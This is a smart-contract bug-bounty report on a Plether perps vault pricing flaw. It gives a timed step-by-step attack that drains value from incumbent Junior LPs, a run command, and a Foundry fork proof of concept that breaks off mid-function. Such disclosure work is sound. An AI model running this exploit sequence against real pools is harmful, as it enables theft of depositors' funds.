# \#98835 [SC-Critical] Junior deposit pricing in HousePool LP epoch settlement ignores the outstanding VPI rebate reserve, which leads to direct theft of incumbent Junior LP funds

**Submitted on Nov 10th 2026 at 13:48:31 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98835
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-reducing open earns a negative VPI. The engine pays that rebate out of HousePool cash at the open and locks it in a reserve on the trader's clearinghouse account. LP NAV does not count the reserve, so Junior NAV drops by the rebate. At the close, the lifetime-VPI clamp sends the whole reserve back to the pool and Junior NAV recovers. A Junior deposit priced while the reserve is out buys shares at the dip and takes its share of the recovery from the incumbent Junior LPs. I ran it on a fork of the deployed v2.0.0 with the real book (39% skew), the real price ticks, every real transaction of the window, and the deployment's own LP epoch keeper doing both settlements. The attacker withdraws 9,123.595321 USDG more than it put in. The incumbent Junior shares end 31,797.966395 USDG lower than when an honest depositor makes the same deposit at the same times.

## Vulnerability Details

The value moves in this order.

1. **The open pays the rebate out of LP cash.** For a skew-reducing open the planner turns the negative trade cost into a pool payout (`CfdEnginePlanLib.sol:333`). The only checks are numeric (`CfdEnginePlanLib.sol:335-341`) and that the rebate fits in pool cash (`CfdEnginePlanLib.sol:730`). The sidecar pays it out of HousePool (`CfdEngineSettlementSidecar.sol:442-444`) and locks the same amount as the trader's VPI rebate reserve (`CfdEngineSettlementSidecar.sol:466-471`, target `CfdEnginePlanLib.sol:348-349`). In the PoC the rebate is R = 63,830.976170 USDG and `pool.totalAssets()` falls from 102,231,237.453802 to 102,167,406.477632.
2. **LP NAV drops by R.** The HousePool snapshot takes `pool.totalAssets()` as its physical assets (`CfdEngineProtocolLens.sol:63-72`), and NAV is those assets plus the terminal price delta minus trader claims (`HousePoolAccountingLib.sol:60-78`). The reserve sits in the clearinghouse, outside both. Junior takes the loss first (`HousePoolWaterfallAccountingLib.sol:167`). In the PoC, Junior NAV falls by 63,666.010985.
3. **The deposit is priced at the dip.** `_settleLpEpoch` reconciles (`HousePool.sol:835`) and prices the matured Junior deposit from the reconciled `juniorPrincipal` (`HousePool.sol:914-920`). The attacker's 95,000,000 USDG deposit gets 94,787,343,818,440,629 shares. The same deposit at the same time, with no open rebate, gets 94,726,655,997,718,665.
4. **The close sends R back to the pool.** The clamp forces lifetime VPI to stay at or above zero (`CloseAccountingLib.sol:116-118`), so the close owes all of R back. The sidecar consumes the reserve into HousePool (`CfdEngineSettlementSidecar.sol:690-693`) and books it as revenue (`CfdEngineSettlementSidecar.sol:604-613`). Junior NAV rises by 64,144.519053, and the attacker's new shares hold 48.48% of Junior.
5. **The attacker exits at the restored NAV.** After the 1 h deposit cooldown it redeems at the next epoch (`HousePool.sol:840-841`, `HousePool.sol:886`).

No check ties LP entry pricing to outstanding lifetime VPI. The NAV that prices deposits leaves out a reserve that the close is certain to return to the pool, while the rebate that reserve backs has already left the pool. `SECURITY.md:871-872` states the reserve does not inflate NAV. Excluding it makes NAV low by exactly R for as long as the position is open.

### Vulnerable source code

**1. The negative trade cost becomes a pool payout @ packages/perps/src/libraries/CfdEnginePlanLib.sol:331-333**
```solidity
delta.tradeCostAssets = openState.tradeCostAssets;
delta.marginDeltaAssets = order.marginDelta;
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
```

**2. The only cash limit is pool cash @ packages/perps/src/libraries/CfdEnginePlanLib.sol:729-733**
```solidity
uint256 rebateAssets = uint256(-cashDeltaBeforeTopUp);
if (rebateAssets > snap.poolCashAssets) {
    return false;
}
poolCashBeforeTopUp = snap.poolCashAssets - rebateAssets;
```

**3. HousePool pays the rebate to the clearinghouse @ packages/perps/src/CfdEngineSettlementSidecar.sol:442-444**
```solidity
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
```

**4. The same amount is locked as the trader's VPI rebate reserve @ packages/perps/src/CfdEngineSettlementSidecar.sol:466-471**
```solidity
if (delta.vpiRebateReserveAfterAssets > delta.vpiRebateReserveBeforeAssets) {
    uint256 reserveIncreaseAssets = delta.vpiRebateReserveAfterAssets - delta.vpiRebateReserveBeforeAssets;
    uint256 reserveFromFreeAssets = reserveIncreaseAssets - delta.vpiRebateReserveFromPledgeAssets;
    if (reserveFromFreeAssets > 0) {
        clearinghouse.lockVpiRebateReserve(delta.account, reserveFromFreeAssets);
    }
```

**5. LP NAV inputs take pool assets only @ packages/perps/src/CfdEngineProtocolLens.sol:62-65**
```solidity
ICfdEngineTypes.TerminalNavSnapshot memory terminalSnapshot = engineContract.terminalNavSnapshot();
uint256 poolAssets = engineContract.pool().totalAssets();
snapshot.physicalAssets = poolAssets;
snapshot.netPhysicalAssets = poolAssets;
```

**6. The matured Junior deposit is priced from the reconciled juniorPrincipal @ packages/perps/src/HousePool.sol:914-920**
```solidity
DepositPhase memory juniorDepositPhase;
juniorDepositPhase.pricingAssets = juniorPrincipal;
juniorDepositPhase.pricingSupply = _juniorShareSupply();
bool juniorActivationDeferred = juniorDepositPhase.pricingAssets == 0 && juniorDepositPhase.pricingSupply != 0;
if (!juniorActivationDeferred) {
    juniorDepositPhase = _settleDepositPhase(juniorVault, result.cutoffEpoch, juniorDepositPhase, 0, false);
}
```

**7. The close clamp owes the whole rebate back @ packages/perps/src/libraries/CloseAccountingLib.sol:116-118**
```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

**8. The reserve is consumed into HousePool @ packages/perps/src/CfdEngineSettlementSidecar.sol:690-693**
```solidity
_requireVpiReserve(clearinghouse, delta.account, delta.vpiRebateReserveBeforeAssets);
if (delta.vpiRebateReserveConsumedAssets > 0) {
    clearinghouse.consumeVpiRebateReserve(delta.account, host.pool(), delta.vpiRebateReserveConsumedAssets);
}
```

**9. The clawback is booked as LP revenue @ packages/perps/src/CfdEngineSettlementSidecar.sol:604-612**
```solidity
uint256 cashArrivedRevenueAssets =
    delta.pricePnlPledgeConsumedAssets + delta.actionChargeCollectedAssets - protocolFeeCreditedAssets;
if (cashArrivedRevenueAssets > 0) {
    IHousePool(host.pool())
        .recordClaimantInflow(
            cashArrivedRevenueAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
```

## Impact Details

- **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.**
  - The attacker minted 96,149,904.854584 USDG into its two wallets and ends with 96,159,028.449905 USDG in them,
    +9,123.595321 USDG.
  - The incumbent Junior shares (99.99% held by the real LP `0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B`) are worth
    100,983,475.550115 USDG at 06:00:21. With an honest depositor making the
    same deposit at the same times, they are worth 101,015,273.516510 USDG. The difference is -31,797.966395 USDG.
  - The attacker's gain from combining the deposit with the trade, against both controls on the same path, is
    +30,982.726798 USDG. The incumbent's change from the same combination is -30,982.727061 USDG.
- The loss is Junior principal held in HousePool. In the honest-depositor control, the incumbent also ends 2,791.75 USDG
  below its value before the open (market drift), so the window has no accrued yield for the loss to come from.
- Every attacker action is permissionless:
  - Junior deposits are uncapped (`TrancheVault.sol:1325`). The attacker uses `requestDeposit`, `claimDeposit`,
    `requestRedeem` and `claimRedeem`.
  - The trade uses `OrderRouter.commitOrder` and `executeOrder`. `executeOrder` has no caller gate
    (`OrderRouter.sol:240`), so the attacker's own keeper fills its orders.
  - The deployment's LP epoch keeper settles both epochs (04:00:12 and 06:00:21). It settled every epoch with a matured
    request since deployment, 12-15 s after the hour.
- The market state is third-party skew. On 6 November 2026 the real book was net LONG 39.9M USDG, 39% of the pool, for
  7 hours. The attacker's trade reduces that skew.
- The incumbent never sees it. The rebate leaves the pool at 03:59:33, the deposit is priced at 04:00:12 and the rebate
  is back at 04:00:42.
- It repeats every epoch while third-party skew is open.
- The capital is 96.15M USDG, below the program's USD 100M line. The 95M LP leg is held for 2 h 10 m and the 1.15M
  trader leg for 69 s.
- Dedup. `SECURITY.md:871-872` says "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV". The
  rebate that reserve backs has already been paid out of the pool, so the line describes why NAV is low by R. It does
  not cover deposits priced in that state. No item in the listed audit reports or known-issue entries covers LP entry
  pricing against an outstanding VPI rebate.

## References

Mechanism
- packages/perps/src/libraries/CfdEnginePlanLib.sol:333 - negative trade cost becomes `poolRebatePayoutAssets`
- packages/perps/src/libraries/CfdEnginePlanLib.sol:335-341 - numeric checks only
- packages/perps/src/libraries/CfdEnginePlanLib.sol:348-349 - reserve target after the open
- packages/perps/src/libraries/CfdEnginePlanLib.sol:730 - rebate limited to pool cash
- packages/perps/src/CfdEngineSettlementSidecar.sol:442-444 - HousePool pays the rebate
- packages/perps/src/CfdEngineSettlementSidecar.sol:466-471 - reserve locked in the clearinghouse
- packages/perps/src/CfdEngineProtocolLens.sol:63-72 - NAV inputs from pool assets and trader claims
- packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78 - terminal NAV
- packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:167 - Junior absorbs loss first
- packages/perps/src/HousePool.sol:835 - reconcile before pricing
- packages/perps/src/HousePool.sol:914-920 - Junior deposit priced from juniorPrincipal
- packages/perps/src/libraries/CloseAccountingLib.sol:116-118 - lifetime-VPI clamp
- packages/perps/src/CfdEngineSettlementSidecar.sol:690-693 - reserve consumed into HousePool
- packages/perps/src/CfdEngineSettlementSidecar.sol:604-613 - clawback booked as revenue
- packages/perps/src/HousePool.sol:840-841 - Junior redemption priced from juniorPrincipal
- packages/perps/src/HousePool.sol:886 - Junior redemption funded

Entry points
- packages/perps/src/TrancheVault.sol:1325 - Junior deposit capacity is uncapped
- packages/perps/src/OrderRouter.sol:240 - `executeOrder`, no caller gate
- packages/perps/src/OrderRouter.sol:479 - `settleLpEpoch(bytes[])`, permissionless

Docs and deployment
- packages/perps/SECURITY.md:871-872 - reserve excluded from NAV
- packages/perps/DEPLOYMENT.md:131-155 - release parameters asserted by the PoC
- packages/perps/DEPLOYMENT.md:510 - LP epoch keeper operations
- deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json - deployed addresses and code hashes



## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/6c6e5b085a059bc9cbae0cfb809a1ad6

## Proof of Concept

## Proof of Concept

The PoC forks the deployed v2.0.0 on Arbitrum Sepolia at Fri 2026-11-06 03:50:00 UTC inside the repo's Foundry suite at `a82d4fef`, and replays all 247 real transactions of the window at their real blocks and times. It proves the attacker withdraws more USDG than it minted, the incumbent Junior shares pay for it, and the deployment's own LP epoch keeper does the pricing.

```bash
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8 && mkdir -p packages/perps/test/poc
cp NegativeVpiRebateDepositMirrorForkPoC.t.sol NegativeVpiRebateForkData.sol packages/perps/test/poc/
cd packages/perps && ARB_SEPOLIA_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test --match-path test/poc/NegativeVpiRebateDepositMirrorForkPoC.t.sol --skip 'test/perps/**' --skip 'script/**' --skip 'src/**' -vv
```

- **Tools:** Foundry forge 1.8.5 (`51a52c59cffd940f76eddd0b4bb1791aa4b5ac7f`), solc 0.8.35, `via_ir = true`, optimizer 200, all from the repo's `packages/perps/foundry.toml` (committed sha256 `666cbbcac1fdc446bd505d297fd413739f39f1aa8e24539f88cdf8e99488d8a1`; the CRLF Windows checkout hashes to `091b3d455f2b6076d5c8d98b97de9336ce41b4f03789a0b67a85825d57c38dc0`). Any Arbitrum Sepolia archive RPC works.
- **Code state:** v2.0.0 was built from `1209ca8a`, and `git diff 1209ca8a a82d4fef -- packages/perps/src` is 0 lines, so the deployed bytecode is the in-scope code. Upstream `Plether-Fi/plether-core` main is `6909f261` (checked with `git ls-remote` at run time), also 0 lines from `a82d4fef` in `packages/perps/src`. The bug is on main and deployed. `setUp` asserts the runtime code hash of all 15 manifest contracts and 22 release parameters from `DEPLOYMENT.md`.
- **What is real:** the pool, book and LPs at the fork block; every keeper price tick (`vm.transact`, each checked against the real post-block mark); every other real transaction, re-sent from its real sender with verbatim calldata and checked against its real receipt's events (0 mismatches); and every price, as signed Pyth payloads verified by the deployed Pyth and Wormhole contracts.
- **What the PoC adds:**
  - The attacker and its keeper are fresh addresses, and `vm.prank` stands in for their signatures.
  - USDG comes from the public MockUSDG faucet `mint`. The program allows mocking USDG.
  - Forge's built-in ArbSys shim returns the fork block, so `vm.mockCall` makes `arbBlockNumber()` return the real L2
    block, as on chain.
  - The LP epoch keeper's settlements are sent from its own address (`0xC60408d3f42A7Aa49889bc94BA6a74b9801b7BDA`) at its measured delay. Every
    `LpEpochSettled` since deployment was its call, 12-15 s after the hour, only for epochs with a matured request
    (`epoch-settlers.tsv` in the gist).
  - Real owner order ids shift by 2 past the attacker's two commits. Each one is checked to be the same real order.

### attack step-by-step

1. 03:50:05. `USDG.mint`, then `JuniorVault.requestDeposit(95,000,000 USDG)` before the 03:55 cutoff, so the deposit matures at 04:00.
2. 03:59:29. `clearinghouse.deposit(1,149,904.854584 USDG)` and `OrderRouter.commitOrder` for a skew-reducing SHORT of 23,804,500 tokens (22,998,097.09 USDG). 03:59:33: the attacker's keeper calls `executeOrder` on the real tick, and the pool pays R = 63,830.976170 USDG.
3. 04:00:12. The deployment's LP epoch keeper calls `OrderRouter.settleLpEpoch`, and the deposit activates at the depressed NAV. The attacker calls `claimDeposit`.
4. 04:00:35. `commitOrder` for the full close. 04:00:42: `executeOrder` fills it on the real tick, the clamp returns R to the pool, and the attacker calls `clearinghouse.withdraw`.
5. 05:00:14. `requestRedeem` of every share, as soon as the cooldown allows. 06:00:21: the LP epoch keeper settles the redemption, and `claimRedeem` sends 95,026,662.364267 USDG to the attacker's wallet.

```
plant : requestDeposit into Junior, then open a skew-reducing SHORT just before the hour
fire  : the LP epoch keeper prices the deposit with the rebate out of the pool; close, then redeem at the restored NAV
```

## main Attack code

### full poc code, single file, single runnable command

The test is below. Its data file, `NegativeVpiRebateForkData.sol`, is generated from the real chain and holds the 251 real transaction hashes, blocks, receipt event hashes, real marks, the verbatim calldata of the 11 re-sent transactions and the four signed Pyth payloads. It is 110 KB, too large for this form, so it is in the gist. Tools: forge 1.8.5, solc 0.8.35 via_ir.

NegativeVpiRebateDepositMirrorForkPoC.t.sol (forge 1.8.5, solc 0.8.35)
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";
import {NegativeVpiRebateForkData} from "./NegativeVpiRebateForkData.sol";

// ---------------------------------------------------------------------------------------------------------------------
// Minimal ABIs of the deployed v2.0.0 contracts (selectors as in packages/perps/src at a82d4fef). A wrong selector would
// revert against the deployed bytecode, so every call below is checked by the deployed code itself.
// ---------------------------------------------------------------------------------------------------------------------

interface IArbSysBlockNumber {

    function arbBlockNumber() external view returns (uint256);

}

/// @dev The deployed testnet settlement token (MockUSDG). Out of scope; its `mint` is public on Arbitrum Sepolia.
interface IUSDG {

    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);

}

interface IEngine {

    function lastMarkPrice() external view returns (uint256);
    function lastMarkTime() external view returns (uint64);
    function sides(uint256 index)
        external
        view
        returns (uint256 maxProfitAssets, uint256 openInterest, uint256 entryNotional, uint256 totalMargin);
    function riskParams()
        external
        view
        returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256);
    function executionFeeBps() external view returns (uint256);
    function settlementBufferBps() external view returns (uint256);
    function frozenCloseSpreadBps() external view returns (uint256);
    function fadRunwaySeconds() external view returns (uint256);
    function isFadWindow() external view returns (bool);
    function isOracleFrozen() external view returns (bool);
    function protocolTreasury() external view returns (address);
    function positions(address account)
        external
        view
        returns (uint256, uint256, uint256, uint256, CfdTypes.Side, uint64, int256);

}

interface IRouter {

    function commitOrder(OrderV3Types.OrderRequest calldata request) external returns (uint64 orderId);
    function executeOrder(uint64 orderId, bytes[] calldata pythUpdateData)
        external
        payable
        returns (OrderV3Types.ExecutionResult memory result);
    function settleLpEpoch(bytes[] calldata pythUpdateData) external payable;
    function maxExecutionWindowSeconds() external view returns (uint256);
    function minOpenNotionalAssets() external view returns (uint256);
    function maxPendingOrders() external view returns (uint256);
    function getPendingOrderView(uint64 orderId)
        external
        view
        returns (IOrderRouterAccounting.PendingOrderView memory pending, uint64 nextAccountOrderId);

}

interface IPool {

    function totalAssets() external view returns (uint256);
    function juniorPrincipal() external view returns (uint256);
    function seniorPrincipal() external view returns (uint256);
    function maxSeniorExposureAssets() external view returns (uint256);
    function maxSeniorShareBps() external view returns (uint256);
    function lpEpochSettlementPaused() external view returns (bool);

}

interface IOracle {

    function getUpdateFee(bytes[] calldata pythUpdateData) external view returns (uint256);
    function basketMaxConfidenceRatioBps() external view returns (uint256);
    function adverseConfidenceMultiplierBps() external view returns (uint256);

}

interface IClearinghouse {

    function deposit(address account, uint256 amount) external;
    function withdraw(address account, uint256 amount) external;
    function balanceAssets(address account) external view returns (uint256);
    function vpiRebateReserveAssets(address account) external view returns (uint256);
    function getFreeBuyingPowerAssets(address account) external view returns (uint256);

}

interface IBook {

    function currentExecutionConfigHash() external view returns (bytes32);

}

interface IVault {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function maintenanceFeeAprBps() external view returns (uint256);
    function requestDeposit(uint256 assets, address controller, address owner) external returns (uint256 requestId);
    function claimableDepositRequest(uint256 requestId, address controller) external view returns (uint256);
    function claimDeposit(uint256 requestId, uint256 assets, address receiver, address controller)
        external
        returns (uint256 shares);
    function maxRequestRedeem(address owner) external view returns (uint256);
    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId);
    function claimableRedeemRequest(uint256 requestId, address controller) external view returns (uint256);
    function claimRedeem(uint256 requestId, uint256 shares, address receiver, address controller)
        external
        returns (uint256 assets);

}

/// @title Fork PoC: a skew-reducing open's VPI rebate leaves Junior NAV and is clawed back at close, so a Junior deposit
///        activated in between buys at the dip and takes the recovery from the incumbent Junior LP.
/// @notice Forks the deployed Plether perps v2.0.0 (Arbitrum Sepolia) on Friday 2026-11-06 03:50:00 UTC, when the real
///         book was net LONG ~39.9M USDG (~39% of a 102.23M pool), and replays every real transaction of the next 2 h 13 m
///         at its real block and timestamp (240 keeper ticks, 4 ERC-4337 trade bundles, 4 owner executions, 3 USDG txs).
///         The attacker's own transactions are inserted between them. Every price is a real signed Pyth payload.
///         The attacker never settles an LP epoch: both settlements are sent from the deployment's real LP epoch keeper
///         0xC604...7BDA at its measured cadence (provenance/epoch-settlers.tsv: every epoch with a pending LP request
///         since deployment was settled by it 12-15 s after the hour). The attacker only opens its skew-reducing SHORT
///         before the hour and closes it after that keeper has priced the matured deposit.
contract NegativeVpiRebateDepositMirrorForkPoC is Test, NegativeVpiRebateForkData {

    // ------------------------------------------------------------------ deployment (release manifest v2.0.0)
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address internal constant CLEARINGHOUSE = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant ENGINE_LENS = 0xfCa322C6868cEf53bD5C344628f9874712e48108;
    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant LIFECYCLE_BOOK = 0x327d5fd04e17D96DD5C4F845A0b4256A9e19645C;
    address internal constant JUNIOR = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant SENIOR = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    /// @dev The incumbent Junior LP: 100719184641992510 of 100729155152871363 Junior shares at the fork block
    ///      (provenance/junior-holders-at-fork.tsv). The rest (9970510878853) is held by the vault itself.
    address internal constant INCUMBENT_LP = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B;
    /// @dev The deployment's real LP epoch keeper (DEPLOYMENT.md "LP epoch keeper"). Every LpEpochSettled since deployment
    ///      was sent by it, through OrderRouter.settleLpEpoch(bytes[]), 12-15 s after the hour whenever an LP request had
    ///      matured: Mon 11-02 08:00:15, Wed 11-04 04:00:12, Sun 11-08 22:00:15 (weekend reopen). It sent nothing for
    ///      epochs with no pending request. Source: provenance/epoch-settlers.tsv (+ epoch-settlers.jsonrpc.log).
    address internal constant LP_EPOCH_KEEPER = 0xC60408d3f42A7Aa49889bc94BA6a74b9801b7BDA;

    // ------------------------------------------------------------------ real timeline (UTC, Friday 2026-11-06)
    uint256 internal constant FORK_BLOCK = 326_504_738; // 03:50:00 (epoch 03:00-04:00)
    uint256 internal constant FORK_TS = 1_793_937_000;
    /// @dev 03:50:05, before the 03:55:00 request cutoff (TrancheVault.LP_REQUEST_CUTOFF_DURATION = 5 min), so the Junior
    ///      deposit request matures at 04:00:00.
    uint256 internal constant DEPOSIT_TS = FORK_TS + 5;
    /// @dev Real keeper tick 0x6df278a7... lands in block 326506962 at 03:59:33 with Pyth publish time 03:59:30: the last
    ///      tick before the hour. The skew-reducing SHORT is committed at 03:59:29 and filled on it.
    uint256 internal constant TICK_OPEN_BLOCK = 326_506_962;
    uint256 internal constant TICK_OPEN_TS = 1_793_937_573;
    uint256 internal constant TICK_OPEN_PUBLISH = 1_793_937_570;
    /// @dev 04:00:00, the round hour at which the 03:50:05 deposit request matures.
    uint256 internal constant HOUR_0400 = 1_793_937_600;
    /// @dev Real keeper tick 0x72ae4e5b... lands in block 326507095 at 04:00:07 with Pyth publish time 04:00:03: the first
    ///      real signed basket of the 04:00 epoch (every component at or after the boundary, as live open-position
    ///      settlement requires). The real LP epoch keeper's 04:00 settlement uses this payload.
    uint256 internal constant TICK_SETTLE_BLOCK = 326_507_095;
    uint256 internal constant TICK_SETTLE_TS = 1_793_937_607;
    /// @dev 04:00:12: the LP epoch keeper's measured delay (+12 s on Wed 11-04 04:00, +15 s on the other two).
    uint256 internal constant SETTLE_TS = HOUR_0400 + 12;
    /// @dev Real keeper tick 0xe2a47de2... lands in block 326507229 at 04:00:42 with Pyth publish time 04:00:36: the first
    ///      tick after the settlement. The close is committed at 04:00:35 and filled on it.
    uint256 internal constant TICK_CLOSE_BLOCK = 326_507_229;
    uint256 internal constant TICK_CLOSE_TS = 1_793_937_642;
    uint256 internal constant TICK_CLOSE_PUBLISH = 1_793_937_636;
    /// @dev Redemption request: two seconds after the deposit cooldown ends (activation time 04:00:12 + 1 h; the cooldown
    ///      runs from depositEpochActivationTime, TrancheVault.sol:1108-1110), before the 05:55 cutoff of the 06:00 epoch.
    uint256 internal constant REDEEM_TS = SETTLE_TS + 1 hours + 2; // 05:00:14
    /// @dev Real keeper tick 0x7248f115... lands in block 326534752 at 06:00:21 with Pyth publish time 06:00:15: the
    ///      first real signed basket of the 06:00 epoch in the window (none published in [06:00:00, 06:00:15) was sent on
    ///      chain), so the LP epoch keeper's 06:00 settlement lands in this block with this payload, 21 s after the hour.
    uint256 internal constant TICK_REDEEM_BLOCK = 326_534_752;
    uint256 internal constant TICK_REDEEM_TS = 1_793_944_821;

    // ------------------------------------------------------------------ attacker parameters
    /// @dev Junior deposit. The incumbent Junior is ~101.02M USDG at the fork block; 95M stays under the program's
    ///      USD 100M case-by-case capital line.
    uint256 internal constant DEPOSIT = 95_000_000e6;

    // ------------------------------------------------------------------ actors (fresh addresses, no history)
    address internal ATTACKER = makeAddr("attacker");
    address internal A_KEEPER = makeAddr("attacker-keeper");

    IRouter internal router = IRouter(ROUTER);
    IEngine internal engine = IEngine(ENGINE);
    IClearinghouse internal clearinghouse = IClearinghouse(CLEARINGHOUSE);
    IPool internal pool = IPool(POOL);
    IOracle internal oracle = IOracle(ORACLE);
    IVault internal junior = IVault(JUNIOR);
    IUSDG internal usdg = IUSDG(USDG);

    Rtx[] internal replay;
    uint256 internal cursor;
    uint256 internal attackerCommits;
    uint256 internal lastBlock;
    uint256 internal lastTs;
    uint256 internal replayed;
    uint256 internal receiptTopicMismatches;
    uint256 internal incumbentShares;
    uint256 internal startSnapshot;

    struct Out {
        // attacker
        uint256 minted;
        uint256 attackerWalletEnd;
        int256 attackerProfit;
        uint256 sharesMinted;
        uint256 redeemedAssets;
        // trade leg
        uint256 shortSize;
        uint256 shortNotional;
        uint256 poolAssetsBeforeOpen;
        uint256 poolAssetsAfterOpen;
        int256 vpiAccruedAtOpen;
        uint256 reserveAtOpen;
        uint256 reserveAtSettlement;
        uint256 reserveBeforeClose;
        uint256 reserveAfterClose;
        uint256 poolAssetsBeforeClose;
        uint256 poolAssetsAfterClose;
        // LP accounting
        uint256 juniorAssetsBeforeOpen;
        uint256 juniorAssetsAfterOpen;
        uint256 juniorPrincipalAfterActivation;
        uint256 juniorAssetsAfterClose;
        // victims and others, at the end of the window
        uint256 incumbentValueEnd;
        uint256 incumbentLpValueEnd;
        uint256 juniorPrincipalEnd;
        uint256 seniorPrincipalEnd;
        uint256 treasuryEnd;
        uint256 markEnd;
    }

    // ================================================================== setup: fork + production provenance checks

    function setUp() public {
        vm.createSelectFork(
            vm.envOr("ARB_SEPOLIA_RPC_URL", string("https://arbitrum-sepolia.gateway.tenderly.co")), FORK_BLOCK
        );
        assertEq(block.chainid, 421_614, "Arbitrum Sepolia");
        assertEq(block.timestamp, FORK_TS, "fork block timestamp");
        Rtx[] memory log_ = _replayLog();
        for (uint256 i; i < log_.length; ++i) {
            replay.push(log_[i]);
        }
        lastBlock = FORK_BLOCK;
        lastTs = FORK_TS;
        _setArbBlock(FORK_BLOCK);
        _assertDeployedBytecode();
        _assertReleaseConfiguration();
        incumbentShares = junior.totalSupply();
        vm.deal(A_KEEPER, 1 ether);
    }

    /// @dev Every runtime code hash equals `contracts.<name>.runtimeCodeHash` in
    ///      deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json.
    function _assertDeployedBytecode() internal view {
        assertEq(USDG.codehash, 0x12233a5f6b0abf6a0f8447e56f9507afdd142a78cc42ebb0d041a3997bd299f6, "settlementToken");
        assertEq(
            CLEARINGHOUSE.codehash, 0xc8e4965893dbd7073303303e9d5ab9c775aabcc1259635e4993fc7fdb0681398, "clearinghouse"
        );
        assertEq(ENGINE.codehash, 0xa0f8e5be6e622a5a83e46e88f6b012757ef924cf613a50cba52a2b5c66b76a6b, "cfdEngine");
        assertEq(
            0x802a0755413FB966b397155b5c5CC0198E6BEd3F.codehash,
            0x16f6c8107b8f2965f1074df12878802c20aac2a54121c4c60854b29e1f18a9f1,
            "cfdEnginePlanner"
        );
        assertEq(
            0xd3EDe337E042d5aa6BA68E03D0c885b3d4A062DC.codehash,
            0x540083c758046571c5770f9950282eef938986ff41d78538109ddf549534b059,
            "cfdEngineSettlementSidecar"
        );
        assertEq(
            0x61C7f7Cf91c295a86250E1e05a91901e8E1e51A3.codehash,
            0x181223a2ac1c4fc3811d6bac5bc882310ff933d5450ffce6de5cf0c44aeb55b9,
            "terminalNavBookV2"
        );
        assertEq(POOL.codehash, 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957, "housePool");
        assertEq(
            ENGINE_LENS.codehash, 0x3af6c7539add5ddd3b517ad7397e717259f63637635cd947495675164d82d1a4, "cfdEngineLens"
        );
        assertEq(ORACLE.codehash, 0x1ecb1ca760e7ba51d958697eeefe06ff7ba1a3ad162b3e7978af3df30393bc13, "pletherOracle");
        assertEq(ROUTER.codehash, 0x6c65de67ef2824572537e3641a71100100c49d909b196c43e5d271312534d3cf, "orderRouter");
        assertEq(
            0x0AE016ef599BCDF0bbBEDba441401c3B6C6184eA.codehash,
            0xfc72fcbe4496d0d5356e96d259536cd4edcb926dd7fe1473a4275ddfb09cb57e,
            "orderRouterExecutionSidecar"
        );
        assertEq(
            0x7B605D7C57C191379822705d8510109D4B2573aA.codehash,
            0x8420be926293c70a880b5f12c07674861563727a04aca954323004855807c8f7,
            "orderRouterLiquidationBatchSidecar"
        );
        assertEq(
            LIFECYCLE_BOOK.codehash,
            0xc3f34d5c32716e1818e1ae1cf5e14892a639bc35f15894610e619afe648ba554,
            "orderLifecycleBook"
        );
        assertEq(JUNIOR.codehash, 0x8d00d3d0273b7a321cbf61232ea79ef0b503fe0d83bb52609321765a0a04f3bf, "juniorVault");
        assertEq(SENIOR.codehash, 0x1ef72eae70097e0207bbe8b4399d0b0e79910c40d6665a42f2c933b037355d8a, "seniorVault");
    }

    /// @dev System reads of the deployed configuration; each value is the DEPLOYMENT.md release value.
    function _assertReleaseConfiguration() internal view {
        assertEq(engine.executionFeeBps(), 4, "executionFeeBps");
        assertEq(engine.frozenCloseSpreadBps(), 50, "frozenCloseSpreadBps");
        assertEq(engine.fadRunwaySeconds(), 1 hours, "fadRunwaySeconds");
        (
            uint256 vpiFactor,
